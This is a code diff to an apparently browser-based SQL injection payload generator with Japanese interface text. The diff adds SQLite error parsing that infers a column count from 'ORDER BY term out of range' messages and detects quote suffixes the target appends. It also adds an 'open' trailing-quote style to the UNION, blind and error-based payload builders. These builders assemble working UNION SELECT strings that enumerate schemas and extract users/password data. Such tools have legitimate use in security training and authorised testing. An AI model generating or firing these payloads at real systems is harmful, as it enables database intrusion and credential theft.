@@ -531,9 +531,22 @@ function analyzeErrorText(text){
     out.actions.push({t:"UNIONビルダーへ (列数を合わせるだけ)",act:"union",db:out.dbms});
   }
   const uc=t.match(/Unknown column '(\d+)' in 'order clause'/i);
+  const obr=t.match(/(\d+)(?:st|nd|rd|th)? ORDER BY term out of range - should be between \d+ and (\d+)/i)||t.match(/ORDER BY term out of range[^\d]+between \d+ and (\d+)/i);
   if(uc){
     out.flags.colCount=parseInt(uc[1],10)-1;
     out.actions.push({t:"UNIONビルダーへ (列数 "+out.flags.colCount+" を設定)",act:"union",db:out.dbms,n:String(out.flags.colCount)});
+  }else if(obr){
+    out.flags.colCount=parseInt(obr[2],10);
+    if(!out.dbms) out.dbms="sqlite";
+    if(!out.dbLabel) out.dbLabel="SQLite";
+    out.notes.push("ORDER BY term out of range は SQLite 特有の形式。上限 = 列数");
+    out.actions.push({t:"UNIONビルダーへ (列数 "+out.flags.colCount+" を設定)",act:"union",db:out.dbms,n:String(out.flags.colCount)});
+  }
+  const sfx=(out.near||"").match(/^(['"`])\s*(LIMIT|AND|OR|ORDER|GROUP|#|--|\/\*|\))/i);
+  if(sfx){
+    out.flags.appSuffix=true;
+    out.notes.push("アプリ末尾サフィックス検出: 入力の直後に "+sfx[1]+sfx[2]+"… が自動付加されている → コメント不要。末尾開放 ('zz1 形式) か ||' か and '1'='1 で閉じる方針が最適");
+    out.actions.push({t:"UNIONビルダーへ (末尾開放スタイルで生成)",act:"union",db:out.dbms,c:"open"});
   }
   if(out.dbms) out.notes.push("DBMS判定: "+out.dbLabel+(out.version?" / バージョン "+out.version:""));
   if(out.dbms==="sqlite"){
@@ -713,8 +726,15 @@ function unBuild(){
   const n=Math.max(1,Math.min(40,parseInt($("un-cols").value||"4",10)));
   const echo=Math.max(1,Math.min(n,parseInt($("un-echo").value||"2",10)));
   const P=PFX($("un-prefix").value);
-  const C=$("un-comment").value;
+  const isOpen=$("un-comment").value==="open";
+  const C=$("un-comment").value==="open"?"":$("un-comment").value;
   const enc=$("un-urlenc").checked;
+  const op=p=>{
+    if(!isOpen) return p;
+    if(/'$/.test(p)) return p.slice(0,-1);
+    return p+"||'";
+  };
+  const OP=arr=>arr.map(c=>Object.assign({},c,{p:op(c.p)}));
   const dual=db.needsDual?" FROM dual":"";
 
   const cc=[];
@@ -723,27 +743,27 @@ function unBuild(){
   cc.push({t:"ORDER BY 総当たり (i=1.."+maxc+")",p:seq.map(i=>P+" ORDER BY "+i+(C?" "+C:"")).join("\n"),n:"エラーになる直前の数 = カラム数。MySQL は Unknown column '4' と教えてくれる。"});
   cc.push({t:"UNION NULL 総当たり",p:seq.map(i=>P+" UNION SELECT "+nullList(i,1,"NULL")+(db.needsDual?" FROM dual":"")+(C?" "+C:"")).join("\n"),n:"列数が合うまでエラー → 合った瞬間に成功。NULL は全DBMS/全型で矛盾しない。"});
   cc.push({t:"ORDER BY 一発確認 (エラー表示あり)",p:P+" ORDER BY "+seq.join(",")+(C?" "+C:""),n:"Unknown column 'N' の N-1 が列数 (MySQL)。"});
-  renderCards("un-colcount",cc,enc);
+  renderCards("un-colcount",isOpen?cc.map(c=>Object.assign({},c,{n:(c.n||"")+" ※末尾開放時はアプリ側の ' が付くが、エラー種類の変化自体が列数のオラクルになる (ORDER BY term out of range)"})):cc,enc);
 
   const ef=[];
   for(let i=1;i<=n;i++){
     ef.push({t:"表示列テスト: "+i+" 列目",p:P+" UNION SELECT "+nullList(n,i,"'zz"+i+"'")+dual+(C?" "+C:""),n:"画面に zz"+i+" と出たら、その位置がデータを出せる列。"});
   }
-  renderCards("un-echofind",ef,enc);
+  renderCards("un-echofind",OP(ef),enc);
 
   const info=[];
   info.push({t:"一括情報 (version|db|user)",p:P+" UNION SELECT "+nullList(n,echo,db.info)+dual+(C?" "+C:""),n:db.name});
   info.push({t:"version",p:P+" UNION SELECT "+nullList(n,echo,db.version)+dual+(C?" "+C:"")});
   info.push({t:"database",p:P+" UNION SELECT "+nullList(n,echo,db.db)+dual+(C?" "+C:"")});
   info.push({t:"user",p:P+" UNION SELECT "+nullList(n,echo,db.user)+dual+(C?" "+C:"")});
-  renderCards("un-info",info,enc);
+  renderCards("un-info",OP(info),enc);
 
   renderCards("un-multirow",[
     {t:"複数行: 1行ずつ取り出し (MySQL)",db:"MySQL",p:P+" UNION SELECT "+nullList(n,echo,"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)")+(C?" "+C:""),n:db.multirowNote},
     {t:"複数行: 一括 group_concat (MySQL)",db:"MySQL",p:P+" UNION SELECT "+nullList(n,echo,"(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())")+(C?" "+C:""),n:"長いと group_concat_max_len (初期1024) で切れる → substr で分割。"}
   ],enc);
 
-  unDump(P,C,n,echo,db,dual,enc);  renderCards("un-nois",[
+  unDump(P,C,n,echo,db,dual,enc,op,OP);  renderCards("un-nois",[
     {t:"代替スキーマ参照",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(db.tablesAlt))+dual+(C?" "+C:""),n:db.tablesAltNote},
     {t:"JOIN でカラム名を暴く (MySQL)",db:"MySQL",p:P+" UNION SELECT * FROM (SELECT * FROM users JOIN users b)a"+(C?" "+C:""),n:"Duplicate column 'id' エラーが列名を1個ずつ漏らす。USING(id) で次々に。",hard:true},
     {t:"カラム名なしで中身を抽出 (MySQL)",db:"MySQL",p:P+" UNION SELECT NULL,(SELECT `2` FROM (SELECT 1,2,3 UNION SELECT * FROM users)x LIMIT 1,1),NULL"+(C?" "+C:""),n:"位置バッククォートで型さえ合えば抜ける。数字列は該当位置の番号で。",hard:true}
@@ -751,7 +771,7 @@ function unBuild(){
   renderXenum();
 }
 
-function unDump(P,C,n,echo,db,dual,enc){
+function unDump(P,C,n,echo,db,dual,enc,op,OP){
   const T=$("un-table").value.trim()||"users";
   const C1=$("un-col").value.trim()||"password";
   const C2=($("un-col2")||{value:""}).value.trim();
@@ -764,7 +784,7 @@ function unDump(P,C,n,echo,db,dual,enc){
   out.push({t:"カラム一覧 (テーブル名 クォート指定)",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(db.cols.replace("{T}","'"+T+"'")))+dual+(C?" "+C:"")});
   const d2=C2?db.dump2:db.dump1;
   out.push({t:C2?"データ抽出 (2列連結)":"データ抽出 (1列)",db:db.name,p:P+" UNION SELECT "+nullList(n,echo,wrapSub(d2.replace(/\{C1\}/g,C1).replace(/\{C2\}/g,C2||C1).replace(/\{T\}/g,T).replace(/\{W\}/g,W)))+dual+(C?" "+C:""),n:Wraw?"WHERE句あり。行が複数なら group_concat/集約に任せる。":"全行が集約されて出る。特定行のみなら検索条件を入れる。"});
-  renderCards("un-dump",out,enc);
+  renderCards("un-dump",OP?OP(out):out,enc);
 }
 
 function unWordlist(){
@@ -812,7 +832,7 @@ function renderBlind(){
   const P=PFX($("bl-prefix").value);
   const C=$("bl-comment").value;
   const enc=(($("bl-enc")||{})||{}).checked;
-  const cS=C?" "+C:"";
+  const cS=C==="open"?" and '1":(C?" "+C:"");
   const LEN=db.lengthFn, SUB=db.subFn, ASC=db.asciiFn;
   renderCards("bl-length",[
     {t:"長さ 等値",p:P+" AND "+LEN+"("+E+")=8"+cS,n:"8 を変えて総当たり。"},
@@ -839,7 +859,7 @@ function genScript(show){
   const {db,E}=blindExpr();
   const P=PFX($("bl-prefix").value);
   const C=$("bl-comment").value;
-  const cS=C?" "+C:"";
+  const cS=C==="open"?" and '1":(C?" "+C:"");
   const url=$("sc-url").value.trim()||"http://localhost:8080/?no=";
   const param=$("sc-param").value.trim()||"no";
   const reqtype=$("sc-reqtype").value;
@@ -994,6 +1014,7 @@ function renderErrors(){
   const P=PFX($("er-prefix").value);
   let C=$("er-comment").value;
   if(C==="||'") C=" and '1'='1";
+  if(C==="open") C=" and '1";
   const items=ERRORS[key].map(e=>{
     let p=e.p.replace(/^1/,P);
     p=p.replace(/-- -$/,C||"-- -").replace(/--$/,C||"--");
@@ -1197,13 +1218,14 @@ function renderXenum(){
   const n=Math.max(1,Math.min(40,parseInt($("un-cols").value||"4",10)));
   const echo=Math.max(1,Math.min(n,parseInt($("un-echo").value||"2",10)));
   const P=PFX($("un-prefix").value);
-  const C=$("un-comment").value;
+  const isOpen=$("un-comment").value==="open";
+  const C=$("un-comment").value==="open"?"":$("un-comment").value;
   const dual=db.needsDual?" FROM dual":"";
-  const items=(XENUM[$("un-dbms").value]||[]).map(e=>({
-    t:e.t,
-    p:P+" UNION SELECT "+nullList(n,echo,wrapSub(e.x.replace(/\{K\}/g,db===DB.oracle?Ku:K)))+dual+(C?" "+C:""),
-    n:e.n, db:db.name, hard:e.hard
-  }));
+  const items=(XENUM[$("un-dbms").value]||[]).map(e=>{
+    let p=P+" UNION SELECT "+nullList(n,echo,wrapSub(e.x.replace(/\{K\}/g,db===DB.oracle?Ku:K)))+dual+(C?" "+C:"");
+    if(isOpen) p=p+"||'";
+    return {t:e.t,p:p,n:e.n,db:db.name,hard:e.hard};
+  });
   renderCards("un-xenum",items,($("un-urlenc")||{}).checked);
 }
 
@@ -1499,11 +1521,12 @@ function initUI(){
     toast("プレイグラウンドへ送りました");
   };
   window.SQLIFORGE.errAct=(btn)=>{
-    const a=btn.dataset.a, d=btn.dataset.db, n=btn.dataset.n;
+    const a=btn.dataset.a, d=btn.dataset.db, n=btn.dataset.n, cc=btn.dataset.c;
     if(a==="error"){ if(d) $("er-dbms").value=d; renderErrors(); switchTab("error"); }
     else if(a==="union"){
       if(d&&DB[d]) $("un-dbms").value=d;
       if(n){ $("un-cols").value=n; $("un-echo").value=Math.max(1,Math.min(parseInt(n,10),2)); }
+      if(cc) $("un-comment").value=cc;
       unBuild(); switchTab("union");
     }
     else if(a==="bypass"){ active.add("quote"); renderChips(); refreshAll(); switchTab("bypass"); }
